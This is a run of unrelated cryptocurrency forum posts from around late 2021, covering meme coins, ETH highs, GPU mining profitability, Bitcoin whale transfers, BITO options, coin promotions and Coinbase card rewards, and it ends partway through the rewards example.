For those who dont know, the "meme" coin craze is not something new. The only thing that changes with the years is the name we give to coins/tokens.

I still remember the time where everything was a copy of bitcoin and look at us now. Every bull cycle the same phenomenon happens, both investors and developers see the market giving crazy returns on investments. Developers feel a rush to put a product out so they cut corners (copy other sucessful projects) in order to get the rush of funding they need (or personal gain). Investors FOMO into new projects that could be the next BTC the next ETH and now the new meme coin. 

Then theres the scammers those that take advantage of the current FOMO in order to line their pockets. Every cycle we get a ton of them it started even before the BITCONNNNNNNECT. Investors want to get rich quick and fall for the same story everytime. I feel like those investors are at fault but at the same time i feel compasion for them because its usually people who think they missed the boat on the "blue chip" cryptos and scammers tell them they are building the next big thingg, also usually these investors are usually inexperienced people who get prayed on because they want to invest in the future of crypto.

And let me be clear i feel like the people behind the projects are more essential then the project itself. Imagine if Satoshi Nakamoto had built inside bitcoin a system to give himself control (im aware bitcoin is descentralized but follow me here) just imagine. In the begining of bitcoin,  information about the blockchain and what bitcoin represented was very scarce all you have to do is go back to the first interviews about it no one knew anything about bitcoin some thought you could replicate fake bitcoins and insert them in the system, if bitcoin had stechy developers it could have been the greatest scam of all time. But it wasnt. Because the people behind the project had principles and wanted to fight financial institutions. 

I belive Meme coins as we call them these days are a gateway for many inexperienced people into crypto which is good. Since we have recently re-entered a bull cycle expect a lot of them, expect them to pump like never seem before, expect a lot of scams. But the beauty of crypto is that as always the bear market will wash away these scams, contrary to the opinion of many it will solidify the crypto space and at the end, the funding we get with these crazy bull runs will bring innovation and adoption to the crypto space.

My Advice :  1. Never invest more then you can afford to lose

2. Always take profits

3. Reinvest on bear markets thats when you will make serious money on legit cryptos.

4. Always do your research not just about the coins/tokens but about the founders, and if   
you invest in a meme coin make sure you know the risks/rewards.

Thanks in advance for reading.

 TLTR: Crypto always corrects itself and at the end of the day the adoption&amp;Funding to advance Techology  is here, and the sky has no limits for what crypto could achieve

2 All-Time Highs in 30 days span, it's incredible!

I can't even put it in the word that how happy it makes me to see my biggest and dearest Investment is finally breaking a huge milestone!

ETH is an Incredible project and it STILL has tons of time to show its true potential and new ATHs! 

But for today, lets enjoy ourselves by looking to this beautiful chart! You all deserved this boys... This is the way!

ETH to $10K is nearer than it ever been before!

If you didn't know, Sushiswap is launching an NFT marketplace called Shoyu. This marketplace does a lot of cool things differently than other marketplaces. 

* It's multichain to avoid clogging ETH mainnet and allow for cheap minting/buying/selling
* It has different royalty and fee structures built in (you can even set a charity as a revenue receiver)
* It ties into Sushi's other products for stuff like artist token creation/swapping (also, 2.5% of fees go to Sushi stakers)
* No ETH required to mint or sell NFTs

But by far the coolest part is just the design and aesthetic. The design has a very sophisticated and luxurious feel, and also even features a metaverse gallery with different skins so you can browse the gallery in a virtual world.

Hi all, hoping to get some info from the community about Celsius. Ive been using Celsius for a few months now and have been happy with the app, rewards, ease of use, but Im seeing now there seems to be new regulations. Im in NY and worried these regulations might impact my account. Am I at risk of having my crypto funds frozen or losing my crypto completely? Or is this a situation where there is just a high level of uncertainty and no one knows yet? 

Any info would be helpful as Ive searched and havent seen anything definitive.

 After looking into El Salvador purchasing BTC, then hearing about them wanting to use some of their profits to build 20 schools, I decided to do more research on their adoption of cc. They're going so far as to give every citizen $30 in BTC . The country has a population of 6.486million, and there are already over 2.1million bitcoin wallets. This is adoption at its finest. I'm excited about the future.

In short: I applied the formula of traditional  Pivots to calculate R6 to R10 and S6 to S10 Pivots into a new Indicator.  Was it worth the time? Did It land me on the Pivots moon? Here is a  walk-through the process with some surprising results:  
[https://rotzeod.medium.com/the-invisible-unspoken-pivots-2151f44f86eb](https://rotzeod.medium.com/the-invisible-unspoken-pivots-2151f44f86eb)

Here's how it works: It calculates  never seen before Pivots from R6 to R10. If you don't know what Pivots  are, you can view my basic explanation [here](https://youtu.be/g8bOxYINOjA) and learn how effective they are. In the case of XRP for example, here are the new Pivots for the last 3Y period:

You say: "Come on Rotzeod, that's seriously in the stratosphere"...

Im not new to the crypto world, I already know what Im doing but since I still havent invested in a big number Id like to learn more on how to trade in a smart and safe way.

Obviously YouTube is full of people promoting shitty coins that wont benefit anyone.
Ive tried to take courses but they all cost money and I dont know how effective these courses are.

If anyone knows a good place to start learning more please link it in the reply section for me and other people who want to learn more about crypto.

 I  recently started a (very) small game hosting business. I have some  international customers who pay absurdly high fees right now via PayPal  subscriptions, so I am trying to find a way to only incur fees to myself  and eliminate any client-side fees. Crypto seems to be the answer to  this.

I signed up for a BitPay  Business account, but they require too much information! I don't have an  EIN, or LLC, or any of that nonsense -- I'm just a guy trying to get  started. I don't have anywhere near $1k-2k to work with a law firm on  registering an LLC. BitPay clearly isn't interested in the little guy.

My  real question is this: Are there any solutions that allow me to create  subscriptions and bill customers on an automatic recurring basis and  accept crypto payments without the client paying any fees on their end?

tl;dr: PayPal Subscriptions but with no fees for international customers (probably can only accomplish this with crypto).

McDonalds making the Mcrib NFT? Nike coming out with virtual goods? Facebook, sorry, Meta, causing any metaversey token to pump after the dog meme coin wave? Is this really what we want? 

Do I just sound like a gloomer shouting Cant you see?! to the corporation friendly engulfing of the space? When you Google who is building the meta verse it answers Facebook, Microsoft, Nvidia, Tencent, and fuxking Amzn. 

Im no purist in what Satoshi wanted but I feel there are much better things that can be done, locally, globally, with blockchain technology, not just pumping out more mainstream products.

Anyone can use crypto, one of the beautiful things about it.  However the whales can manipulate the market so much to make them pocket change and the average people end up getting shafted for it. 

I could dump my life savings into a coin and it wouldnt even be known , yet a billionaire can drop a fraction of his cigar and brandy money into something; the price soars and he sells and everyone holding a bag gets to free fall on the price drop . 

I understand thats how the world works but its just a crummy feeling and a lot of people getting screwed need the money , I know people say dont invest more than you can afford to lose; but some people want a better life so much they stretch themselves thin to give themselves a shot. 

Another new car or vacation house doesnt matter much to the ultra wealthy; its nothing more than a game to them .

While its great that we can now send money anywhere in the world peer to peer, without a third party. There are so many more implications to this technology I think alot of people fail to realize.

My ultimate dream of crypto is to use it to eliminate politicians and have a society where people vote directly on laws. Blockchain could be used to vote securely from the device in our pockets. Why do we still use a representative system which is designed for a time when the fastest way to send a message was via man and a horse??

But much more practically this technology could be used to make our world far more democratic in many areas. Decentralized organizations can allow all members to vote on decisions, instead of just a few at the top. For a great example of a decentralized system, look at wikipedia. Its an incredible resource and it is made by thousands of anonymous posters. Or look at reddit, this site is amazing and its because it is curated by millions of people casting votes, not just a few fatcats who run the site.

With blockchain we could securely create mini democracies in so many areas and make much more fluid and robust organizations. 

I get giddy just thinking about it.

I have been DCA-ing on BTC and ADA since March 2021. I chose BTC because it is the pioneer coin which started the cryptocurrency as we know it. I chose ADA because I like its long-term vision and how it tries to help African nations and other developing countries to break free from legacy banking systems, costly middlemen, and established political structures.

I am a long-term hodler so I'm not really crazy about market volatility and getting rich overnight. Only 10% of my portfolio is in crypto, and since I can only spare that much a month, I feel like I need to choose 3 or 4 coins only to invest on.

How do you choose your coins?

First of all I want to be clear: The best way to make steady and safe gains is to DYOR and invest in good long term projects that will keep growing. The obvious choices here are BTC and ETH, but needless to say not the only ones(looking at you ALGO and DOT). 

My point is, this is a highly irrational market due to the fact it is still relatively new, and there is lots of ignorant people hoping to become rich. The good thing about this is that you can take this to your advantage. Irrational hype and marketing (whether it is good or bad) can make any coin skyrocket, even if it is the shittiest coin out  there. Only during the past few weeks we have seen this phenomenon in this sub, the best examples being SHIBA and LRC. It doesn't matter if the hype is justified or not, the only true fact is that those coins pumped like hell.

As a conclusion, if you are weary enough, you can make some nice gains through shitcoins in a short period of time, if you are early enough. This sub alone is a good place to identify the hype, so take it into account.

PD: Never invest into any shitcoin or memecoin after it has already pumped, that would be the worst mistake.

Hi people! I've seen a lot of you over the past couple of days ever since the LRC news and it's great that you're here. More exposure is always better and since we're mostly here to make money so is the extra capital. 

Few things though: 

- This isn't WSB. I've seen multiple people calling others names which is normal and funny, and expected, on WSB, but it isn't the norm here. Not all of us are gay. 

- I've seen some new people calling red candles "dumps". A 5% red candle after a 25% pump in under an hour is not a dump, a pullback, retracement or consolidation: it's normal in crypto. I'd reserve those names for a 25% drop after a coin pumps like LRC just did. 

- If a new person asks a question they usually get a decent answer, so please don't mess with the new users like you'd usually do.

- Shitposting is obviously allowed (and how a lot of the farmers here harvest their moons), but we still try to be nice.

- Expect more volatility than in stocks (unless of course you usually meddle in FDs)

- Don't over invest in meme coins. Chuck a nice bag of cash into some of them if you like but losing half of that within a few days is a big possibility. 

- Open up your vaults and you can receive moons! It's free crypto for the karma you receive.

So yeah welcome, but remember to be nice!

So you want to hobbyist mine, or maybe you want to invest in a rig setup or a Bitmain or one of their competitors. Well, I've done a little of the due diligence for you so you can consider the costs and the stress on your hardware.

TL;DR: &gt;!You can make money doing this, but it clearly scales based on how much you're willing to initially invest. And the startup costs can be prohibitive, especially if you're looking to use an ASIC miner or miners. !&lt;

# Personal Computer/Rig

I personally have 1 NVIDIA RTX 2060 Super 

This is my home computer that I use for other things too, but based on data from 2Miners (where I've mined in pools) and other data from other profitability calculators, this is what I could earn if I used my personal GPU 24/7 to mine ETH:

https://preview.redd.it/mzu6br34g7x71.png?width=1716&amp;format=png&amp;auto=webp&amp;s=a0a168044f0ec09b8b4fb9098af82025983ce712

The profit fluctuates between $3.00 - $3.50 right now based on data from 2Miners. I dont get paid in ETH, I get paid in Nano because: fees. 2Miners will convert ETH mined to NANO on Kraken and Binance at spot prices. So the ETH is converted to Nano and sent to me in NANO. Here's another cart that looks at historical profitability of my GPU:

&amp;#x200B;

https://preview.redd.it/5g6h6aztg7x71.png?width=2272&amp;format=png&amp;auto=webp&amp;s=e0b0c72d453fe3176dbba08e9096a78e656a8457

Lets assume the lower average of $3 after electricity costs, as outlined in the chart above

x 7 = 21 / week 

x 31 = $84 / month  

x 12 = $1,008 / year  

My computer is paid off, so this is pure profit at this point. I built my CPU summer of 2020. But I dont run it 24/7, and I use my computer to play games, do work, etc. So I'm not mining 24/7. I mine only when Im at work or asleep. I'd estimate that I mine around 12-17 hours a day during the work week. This is only 70%, at best, of the day. So realistically Im only making $2 a day or $10 a week mining 5 days a week and $40 a month doing it. But thats almost $500 a year mining part-time. 

Considering that I keep my unit in good condition, in a house that is cool and airconditioned, and my temperatures don't run too hot, the life of my GPU could last, let's be conservative and say 4 years. That's $2,000 over the life of my GPU that cost me $420 new when I bought it. So I'll net $1,580. Cool! I doubt I'll run my GPU every single day that I've hypothetically outlined here for the next 4 years, but you see the point I'm making. It's doable. And it would make you a little bit of money doing so. Is that worth the time and effort? You decide. It also doesn't account for the long term reality that ETH is moving away from PoW to PoS and long term you'd need to mine something else instead.

Now let's assume you want to start soon and buy one of the forthcoming NVIDIA cards like the RTX 3090 TI. These are estimated to profit around $9.20/day. Thats \~$3,400 a year using one GPU. But the cost of a brand new card is around $1,600 based on prices from BestBuy and newegg. They're also sold out, so getting one would be a feat of its own. That would take the first half of your first year of mining to pay off (approximately).  And if youre running it in a computer 24/7 (assuming again a similar worst case life span) you could profit around $13,600 on this new GPU. So $13,600 - $1,600 for the GPU. You're looking at $12k net profit. Now, go big! Scale up your setup and buy 10K worth of GPUs, brand new. That's roughly 6 RTX 3090s you've bought to setup a little mining rig. Thatll net you $72K after 4 years. But again, this is assuming nothing goes wrong. And excluding other costs like rising difficulty and competition with ASIC miners.

# Using ASIC 

The brand new Bitmain E9 will most certainly be a more costly initial investment. But several mining websites are estimating profitability anywhere from $75k to $95k:

https://preview.redd.it/uyo45y9ml7x71.png?width=1542&amp;format=png&amp;auto=webp&amp;s=60379133eaeaac848f62e1ede4bc3bd873d7f3de

Assuming you spend $30k for one miner + setup costs &amp; electricity. Youd net $65k.  But most folks aren't going to have the initial startup means to go this route. It's certainly much more cost prohibitive.

However, as the saying goings, spend more/invest more and make more. But this comes with the added maintenance and upkeep of, realistically, running a small mining business. 

Feel free to leave feedback on my math and any other considerations I may have missed in the comments. I know there's lots of new folks in the sub thinking "I'm going to mine BTC or ETH and start making gains," but it's not that simple and comes with its own challenges and expenses to consider.

couple of questions that i cant seem to find answers to.

Does anybody on this sub actually make money?

If everybody wants crypto to be adopted as a form of currency, dont we have to spend it? Seems like if everybody is hodling then it will never be adopted.

I still dont know what maxis means?

if anyone can let me know how to post over at r/cryptocurrencymemes ? I would really appreciate it, I am new to crypto but have been making memes for a while and would like to post some.

any podcast or youtube channel recommendations would be great.

does everyone on here also receive Private messages trying to offer you great deals on to sign up at random websites? or offers on some new tech coming out? 

thanks for any answers you may be able to provide.

There is always time where we buy the dip and dollar cost average so that we can reduce our overall volatility and risk tolerance.

But how do we actually learn to take profit as it is rarely mention.

Do we take profit when we do not believe in the coin anymore? Do we remove bit by bit or do we just remove at one goal.

Its always puzzling when I am selling as I am afraid that I will miss out on the next pump.

I dont know about you guys, but thats what I always feel. That is why I rarely sell my crypto at all.

So please let me know how you guys take profit!

On November 1, at block height 707,639, a blockchain parser caught two bitcoin whale transfers that moved approximately 19,876 bitcoin worth $1.2 billion in the mix of 2,819 transactions. Interestingly, the owner used a similar splitting mechanism the old school mining whale blockchain parsers caught, spending strings of 20 block rewards throughout 2020 and 2021.

Bitcoin Whale Watching

Bitcoin whales are mysterious animals because in a blockchain world of pseudonymity we only see them when they move. Last year and this year as well, Bitcoin.com News has hunted a specific whale entity that spent thousands of bitcoin mined in 2010.

Every single time the whale spent the decade-old bitcoin that sat idle the whole time, the entity spent exactly 20 block rewards or 1,000BTC. After the transfer, the wallets holding 1,000BTCdispersed the funds into smaller-sized wallets.

According to the creator ofbtcparser.com, the close to 20KBTCtransferred at block height 707,639 on November 1 shared similar splitting mechanics with the 2050 awakenings. The blockchain parsers owner would guess that the entity spending the two transactions could be the same person or organization.

The special transactions stemming from block height 707,639 derived from the bitcoin addresses 15kEr and 1PfaY. The 15kEr address transferred 9,900.87BTC, while 1PfaY spent 9,975.31BTC.

The two transactions were filtered among 2,819BTCtransfers with 6,406 inputs recorded in block 707,639. The output total in that block was 9,587 with 78,704.53BTCdispersed. The two transactions stemming from 15kEr and 1PfaY, represented more than 25% of theBTCprocessed in block 707,639.

After the funds were sent, the nearly 20KBTCwas split into 200 wallets with 100BTCeach. Then the bitcoin whales funds were split again into much smaller wallets until they finally consolidated into different amounts.

The 2 Transactions Leveraged Moderate Privacy Tactics  50 Bitcoin Block Reward From 2011 Spent 59 Blocks Later

Datafrom blockchair.coms Privacy-o-meter for Bitcoin Transactions tool shows the wallet that sent the 9,975.31BTCgot a score of 60 or moderate. This is because matched addresses were identified and blockchair.coms tool notes that matching significantly reduces the anonymity of addresses. The 9,900.87BTCspend suffers from the same tracking vulnerabilities as matched addresses were also identified.

Alongside the close to 20KBTCtransfer in two separate transactions, 59 blocks later 50 sleeping bitcoins that had sat idle since April 28, 2011, were transferred at block height 707,698. The 50BTCsat idle for over ten years since the day they were mined and when they were transferred, the exchange rate for the block reward of 50BTCwas just over $3 million.

Blockchair.coms privacy tool indicates the transaction got a score of 0 or critical. A critical score means that the tool identified issues [that] significantly endanger the privacy of the parties involved.

BITO is an ETF made up of BTC futures. You can Google the formula for futures, but generally speaking, it follows the price of the underlying asset (BTC in this case). 

This ETF was just created on 10/19/21, and was the 2nd most traded ETF ever with over $1B of shares changing hands. 

The reason I bring this up into this chat is because my usual stock chats don't allow talk of crypto. This is a weird crossover between crypto, and traditional financial markets that I feel has a huge money making potential. 

This brings me to options. Options is not the same as margin trading. 

Options are exactly that, an option to buy or sell a stock at a certain price (strike price) on a certain date (date of expiry).

Think of it like leasing a car. You pay a monthly premium for the option to buy the vehicle in 36 months. If you decline then you are out your lease payments (premium) but you don't have to buy the car that you don't want. 

Now that we're somewhat familiar with options I'll explain why it matters. Options matter because each options contract is made up of 100 shares. So, 1 Tesla option would be the option to buy 100 shares of Tesla. Same thing in the case of BITO. 

Along with increased leverage, options also negate a lot of risk. Since you're leasing the car, you don't worry about it breaking down or the engine going out. Think of this as the stock going to zero. If it does that and you own shares you're screwed, but if it does that and you own options then you lose your premium, but you walk away from the stock and are not required to buy it. 

With all of this said, I'm highlighting this opportunity for people with smaller portfolios. Some of my friends have bought about $200 worth of options, and would be in line to make thousands if Bitcoin only goes to $90k. 

If this is way over your head, then just ignore it. But, if this interested you then please look into BITO or another BTC ETF. 

For transparency, my options are calls mainly for 12/17 and 12/31 in the $45-60 range. 

By the way, the stock price does not need to go to the strike price for you to make money. If the asset price goes up, the value of your option will go up as well. 

Obviously it's always better to hold actual BTC long term, but I feel this is a solid low risk, high reward way to utilize the bull run for smaller portfolios. 

As always, I'm a moron and this is not financial advice.

This is not financial advice but I have been following ANKR for a while now. If you have noticed it has been putting in some insane pumps the past few days, only to drop back down. Why?

Well first off, it was in escape velocity bro the moon but many whales sold off their bags. This is good in the long run cause those bags were bought up and now there is some decent amount of long positions at a higher price. ANKR needed this to breakout, cause as it's price action has shown, the coin wants to move. Why is that?

First and foremost, ANKR is a web3.0 play. They are tweaking it's offerings, but alot of what they seem to do is to connect up networks...or as Facebook calls it, the metaverse. Whatever you want to call it, web3.0 is the next speculative tech boom with real world application and Blockchain s lend themselves nicely to this new ground. Seeing as Ankr is all about this new world and bridging the gaps between Blockchain s and the web, I think it could be huge.

They've been uping their marketing tremendously lately. They sponsor the Sacramento Kings, so not a shit coin.

It's still 'cheap'. To encourage new investors.

Its market cap still has serious runway. Currently around 1bill. I think it could be 10 bill easy.

They serve on the BTC mining council, so they are on the inside to some degree, which should help their staying power. 

Ankr is all about helping make crypto more accessible in my eyes, and as crypto adoption continues to take hold, ankr is positioned as the service to facilitate it in the real world.

Ive been in cryptoverse for 7 years, and I find interconnectivity between smart chains the biggest hurdle many teams are trying to solve these days. Alongside Polkadot substrate and parachains, Polkadot bridge seems to be another cutting-edge tech trying to connect all main chains and build an integrated ecosystem. 
Researching on this, I stumbled on this small project that is seriously working on Polkabridge to bridge Binance smart chain to Ethereum with a cross-chain AMM DEX. Check them out here and lmk what you think: https://paybswap.finance/static/media/Whitepaper.f1d731e1.pdf

So, the learning curve in crypto is very steep, and finding a good outline when you're learning is hard. In my rabbit hole sessions, the learning can be very fragmented. A YouTube video there, a cours here, some online article I write somewhere else. I'm finding it hard to find comprehensive courses. Suppose I'm trying to curve out a career path on the blockchain. Crypto related stuff, DeFi, DAO, etc. Like, let's say in the next three years, I'm planning to start a firm that's going to help people find solutions on the blockchain or something like that. Help communities thrive through the blockchain, or small bussiness, something like that. Because the blockchain has very real-use world case beyond holding Bitcoin, etc. What's the best course for me to start on that you can find online ? 
Any thoughts are appreciated!

Harmony ONE:

After doing lots of research into altcoins Harmony ONE was the ONE I found to be the most appealing and has, in my opinion, one of the best teams out there consisting of members who have worked for Apple, Microsoft, Amazon and Google. The technology that is being used is, to my understanding, lightyears ahead of competitors and therefore really undervalued. In December they are planning to enable Apple Pay in their ONE wallet, and I believe that they will accomplish this very successfully especially as the founder,  Stephen Tse, has previously worked for Apple and even sold a company to them before!

&amp;#x200B;

They have just released an amazing video to promote Harmony ONE and I think it deserves some recognition. I hope that they keep this level of marketing quality up for their BTC Bridge and Trustless ETH Bridge coming soon!

I am not shilling nor am I a developer. I simply am an investor of Algo. 

I have had various crypto since back in 2017 but none have I been more involved in than Algorand. Most of my holdings of other coins are simply just a buy and hold. Algorand feels more hands on. Its not like Im sitting here researching every day, ways to make money in Algorand fall in your lap.

With Algo, I vote on stuff, I send stuff around, Im in yieldly pools, governance, etc. Its actually kind of feels like I matter. Not to mention, everything is super easy and user friendly. 

Im actually kind of surprised that not many other cryptos have their own wallet and/or governance programs. Algo shows me what is out there for the future. I love that. I wish more of the crypto I held involved me like this does. 

As bullish as I am, I like to take it day by day. This way I dont get let down so bad if anything happens.

That's it, I just wanted to express my frustration here. I am done with fuck ETH gas fees. $200 to transfer freaking 30 fucking dollars? Are you kidding me? We need ETH 2.0 or whatever the fuck is solving this problem. I heard something about Loopring or whatever. Please ETH, what are you waiting? This is stupid.

Last time I REALLY needed to make a ETH transaction. I never did that, I ended up paying $250 just on fees. I just wanted to buy 3 fuckin Axies on Axie Infinity. Floor Axies. They costed in total $400 but ended up buying half of that amount just for fucking fees. Now, I want to transfer $30 freaking dollars and guess what? I need to pay still $200 on fucking fees.

WHY ETHEREUM, WHY??????????????????? I just want to MOVE MY MONEY AROUND WITHOUT FEES!!

CRO have been going up steadily and they even got Matt Damon as an ambassador. That was some solid advertising if you tell me. Totally rooting for crypto.com here as their customer service is on point.

DOT is another one that needs lots of love as this was under the radar when Shiba went up like mad. But I am glad that people are finally realising their potential and they manage to reach all time high.

I am so proud for those that hold through the past few months. Give yourself a pat in the back.

Is anyone holding these coins?

It's common knowledge that the only constant of crypto is that it will always go right, regardless of whether it goes up or down. We all hear this. And we often fail to internalize it, because we want to believe our analysis of the situation is what will actually happen.

I, and a lot of people here, have followed the 3 rules of crypto: doing our research, following our gut and ignoring this sub's advice. And for me at least, it's gone pretty well. These 3 rules do give you a greater chance of making good investments, and putting money into solid projects with an actual future is the closest thing we have to a safe bet here in crypto.

But remember, all our knowledge comes from past data. While it gives us an accurate idea of how charts might move in the future, it's more akin to meteorology than future sight. 

You may very well do everything right, everything I said above, and still lose a lot of money because crypto is that volatile. I fully think we're on the verge of an even bigger bull run, that's what my gut and my research tell me. And yet the market could very easily crash 50% or more tomorrow, or the day after that, and it wouldn't surprise me one bit. It'd make me shit my pants, but it wouldn't surprise me.

Remember how volatile crypto is, and remember that the only good weapon against such a system is holding and DCAing.

DYOR?

There is a lot of people on this sub asking for advice/guidance and I very often see DYOR at the end of the responses. What I never see if actual pointers on how that is done. 

So the question is, what are some reliable resources we can use to read crypto news? Any reputable people to follow on social media that dont just shill coins they hold bags of? 

I feel like I personally spend too much time searching this sub looking for crypto news and by the time it gets here its usually too late. Appreciate any resources you guys share!

It to me like I'm fiftyonethousand? 

Loopring market stats..

The volume is seemingly considerably higher than circulation supply and market cap while most transactions appear to be sells. I've seen this before but slightly different where most transactions were buys(shib)..

Anyways I really would like to have more understanding of the markets and realize I could just as easily Google this information likely. Though I feel interaction and thoughts from the community itself are more genuine and therefore more worthy of my time. 

Also curious if anyone else has had trouble withdrawing from coinbase lately..I've been using it now for most of the year and never had any issues with it until yesterday. Says the withdraw completes but then immediately returns to cb account simply saying received funds from coinbase. Been in talks with the bank and it's not on their end. Any ideas what I might be doing wrong or overlooked? 

Five hundred characters is alot. I almost feel like I should go on about pointless bullshit for another 20 minutes of pulling every single carpet fiber out of an old area rug before placing them in separate zip lock baggies in order to hand out for Christmas.

You will maybe laugh on my research. Feel free to post any cons arguments if you find something wrong from my research. I will be happy to hear other opinions.

First thing I want to mention is such a similarity in the graph patterns between CKB and BTC. I uploaded an image. I think you will need to swipe right, or sth.

The similarity is really perfect, right? I don't have much time on research, but I am sure that many coins share the same characteristic like CKB. All the coins follow BTC, right? But such a pattern really did intrigued me.

Now, take into the consideration the market cap of CKB. "Only $570m". If you are not familiar with this coin, please read about it, because I am not going to explain it right now. Do your own research. What  I can say that the coin is really promising by the project idea, and the development stage is not as much behind for the market cap it has. Comparing it to many other coin, this one definitely deserves to be around 2B market cap.

Another thing to take into the consideration is an actual fan base of the token. Check other subreddits and places that actually promotes the project and see how much people are into this one.

The project is very alive, and I was surprised that it couldn't go over 0.02 for nearly the whole week. Then I realized it was due to bitcoin falling down too. The volume wasn't too big neither. Now, as we all know, this month is statistically the best month(?). TradingView mark for BTC is "STRONG BUY". CKB mark is "BUY". 

If BTC goes to 80k this month as many analysts predict, CKB could go really really high up. My target price is 0.027-0.03, before some correction. Final price expectation is 0.05-0.08 by end of the year. (Assuming BTC reaches expected 100k)

Many things depends on today. Like, BTC is now around 63K. It's high is around 65K, which is going to start the bull run, or go down on 60-61K, which could delay it.

Do your own research. Hope you liked mine :D

Hi guys,

I was hoping to seek out a little community help on portfolio allocation. Ive been investing in ETH for a while, and Im a long-time lurker of crypto Reddit. But now Im looking to diversify going forward.

Im investing medium to long-term, and Id like my contributions to be pretty much set on autopilot, so I can concentrate my energies into other things.

I was just wondering how some of you would divide your portfolio up (by %) between the following coins:

ETH
ADA
VET
ALGO
NANO
MATIC
LINK
DOT
XMR

If there any coins there that you feel dont quite fit the portfolio then feel free to let me know.

Cheers in advance!

Wow!  This is I think the first politician to do this, happy to hear this news. When politicians will start to take up initiatives like this- adoption will grow even more in public!   


This is a big news coming after recently I heard some pro athletes also agreeing to accept payment in crypto, I am hoping to see more of this!   


Earlier he also said he is considering the use of BTC to pay workers and also for tax payments! He also sent a proposal to the city commision in regards to invest a limited amount of city funds in BTC as a long term hedge!!  


Looking forward to seeing what happens

Hey everyone! Hope you're all having a great Tuesday.

This is a very long post. I wrote it starting last week - some numbers may have changed. Im looking at the concepts not actual timing of numbers. It shouldnt affect this post.

**TL;DR**: I'm interested in discussing the best path to maximize usage and benefits of the Coinbase card. I want to hear other thoughts on how to use the card to get the most crypto.

&amp;#x200B;

I've been using the Coinbase card for two months now. I'm putting the general card details down, my thoughts and how I'm using it now. I'd love to hear other peoples thoughts on how to best grow your net worth + crypto through using it.

I searched around on Reddit and from what I could find there are a few posts about the card, but nothing going in depth on the optimal way to use it. I'm into budgeting, churning and personal finance - hearing other peoples thoughts in this area appeals to me.

~~TL;DR 2.0: I'm not a financial advisor, HODL.~~

# Overview:

For those that don't know Coinbase has a debit card that you preload with USDC or a coin of your choice to spend while you use it. You must prefill your account with the crypto you choose to use the card. It uses that crypto to do your purchases, then gives you a small return of a crypto of your choice from a list of options based on how much you spend.

In general, I'm a big fan as its much easier to budget your money on a preloaded debit card. I put all my budget on it for the month and spend away knowing that I can't go over. Since it also has crypto back it competes with credit cards (CC) that offer cash back incentives. I try to avoid credit when the benefits arent there as its easy to overspend if you're not careful. CC benefits is why I historically would do most purchases with a CC.

I see the card as a great way to help me budget and not overspend. Since you get rewards similar to a CC I dont feel like Im missing out by using a debit card. Ultimately this makes it easier for me to avoid getting debt, and instead spending only what I have and growing my net worth.

# Rewards:

For every dollar you spend with the Coinbase card you get:

4% back on -

* XLM
* GRT
* AMP

1% back on -

* BTC
* ETH
* DOGE
* DAI

Since there isn't any conversion cost to go from XLM, GRT or AMP to another coin on Coinbase I see them as the obvious choice. Maximizing your return at 4%. The follow up question I have is should you hold one of those coins or convert to something like BTC or ETH? You could also do a different altcoin you're bullish on.

I'm bullish on XLM thinking it has a lot of potential use for the future, but it is a bit stagnant and would love to hear other peoples thoughts on what they think is the right path for rewards.

Also, a little bit curious if anyone does the 1% back? I don't really understand why Coinbase gives 4% back in some, but 1% in others. I dont see why someone would pick the 1% unless they don't like the 4% coins and don't want to have to manually do conversions to something like BTC occasionally.

Benefits aside I'm curious if they have deals where those coins are donating coins to Coinbase to support the 3% difference, with a goal to grow their user base? Where is that 3% difference coming from, I have no idea.

&amp;#x200B;

# Fueling the Card:

To use the card, you need to have it pay with a coin of your choice that you have in Coinbase. I'm going to split these into two sections: USDC, and any other crypto. Read below to see why.

**USDC**

USDC has the below benefits going for it that I can tell on Coinbase:

1. Free transfers from your bank and free conversion from dollars.
2. .15% APY return.
3. No fee spending USDC with the card.

The first point is nice since Coinbase charges a fee to buy almost all coins from dollars except USDC. Essentially if you have $100, you can turn it into 100 USDC and spend it on the card without a change in value.

Second point is meh IMO, its not much of a return on the dollars you keep, but its something so I'll call it out. Plenty of checking or savings accounts at normal banks offer similar returns. Also, inflation these days causes more damage than a .15% return gives.

Third point is important, other coins have a 2.49% 'conversion' fee that Coinbase charges to turn the coin of your choice into dollars to spend. I go into this more in the other crypto section below.

**Other Crypto**

For sake of simplicity and an example let us say I decide to use BTC as my coin to purchase with. You however can choose any coin you want, the math below should all be the same.

It has these negatives:

1. Free transfer, but a conversion fee from dollars to BTC.
2. 2.49% conversion fee for Coinbase to convert the coin into dollars to spend.

But it has this positive:

1. Nonstable coins change value as an investment. BTC in the last month at the time of writing this has gone up 41.35%. Your 100-dollar budget as you spend through it could potentially become more money sitting there as you spend it.
   1. It is important to note here that this is great for a bull cycle. If an event like May happened again you could lose a lot of money from your budget. I would not recommend this method to anyone who doesn't have a fully stocked emergency fund especially if you use this method to buy necessities such as groceries. **Do not invest money you can't afford to lose.**

I currently am doing USDC to fund the card, it is safe, and I'm getting 4% back. What I'm curious about is would I make more if I spent BTC instead? What do others do and how has it worked out for you? To help dig in I've put an example below.

&amp;#x200B;

&amp;#x200B;

**Example**

For simplicity lets say a person named Sydney has the Coinbase card and has a budget of 100 dollars a month for toys and games. They use their Coinbase card to only buy toys and games. This helps them keep a budget on not overspending in this area. To also help keep the example simple lets say a month has four weeks, and Sydney spends 25 bucks a week of her budget. At the end of the month, she adds another 100 dollars.

Again an example, 100 keeps it simple, 4 weeks in a month, 25 bucks a week. Also helps keep math simple as 4% of 25 is 1 dollar for returns.

&amp;#x200B;

*Sydney uses USDC*

On the first of the month, she buys 100 USDC. She chooses to get 4% XLM back as her reward in this and the BTC example.

|Week|Spend|Balance + 4% XLM back|
|:-|:-|:-|
|1|25 USDC|75 USDC, $1 XLM|
|2|25 USDC|50 USDC, $2 XLM|
|3|25 USDC|25 USDC, $3 XLM|
|4|25 USDC|0 USDC, $4 XLM|

Pretty simple, she had no transaction fees to use the card always getting to use 25 USDC a week and ends the month with no USDC and $4 of XLM which is great. XLM likely could have gone up a bit in a month but we'll ignore the rewards as both examples end with the same amount of XLM.

*Sydney uses BTC*

Buying $100 worth of BTC costs Sydney $2.99 so she ends up with $97.01 worth of Bitcoin in Coinbase.

Bitcoin changes price but overall has always gone up over long periods of time. In the last year it has gone up 363%, this example isn't meant to be perfect - only show the benefits of using BTC to spend. For simpler math we'll do 363 (gain in a year) / 52 (weeks per year) = average 6.98% gain a week.

